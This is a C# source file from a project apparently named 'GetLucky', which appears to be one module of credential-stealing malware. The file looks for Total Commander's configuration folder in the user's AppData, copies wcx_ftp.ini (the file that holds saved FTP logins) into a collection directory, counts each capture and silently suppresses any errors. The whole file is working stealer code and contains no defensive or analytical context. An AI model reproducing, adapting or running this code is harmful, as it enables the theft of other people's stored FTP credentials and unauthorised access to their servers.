using System.IO;

namespace GetLucky
{
	class TotalCommander
    {
        
        public static int count = 0;
        public static void GetTotalCommander(string GetLucky_Dir)
        {
			try
			{
				string text2 = Help.AppDate + "\\GHISLER\\";
				if (Directory.Exists(text2))
				{
                    Directory.CreateDirectory(GetLucky_Dir + "\\FTP\\Total Commander");
                }
				FileInfo[] files = new DirectoryInfo(text2).GetFiles();
				for (int i = 0; i < files.Length; i++)
				{
					if (files[i].Name.Contains("wcx_ftp.ini"))
					{
                       
                        File.Copy(text2 + "wcx_ftp.ini", GetLucky_Dir + "\\FTP\\Total Commander\\wcx_ftp.ini");
                        count++;
                    }
				}
			}
			catch {}
		}
    }
}


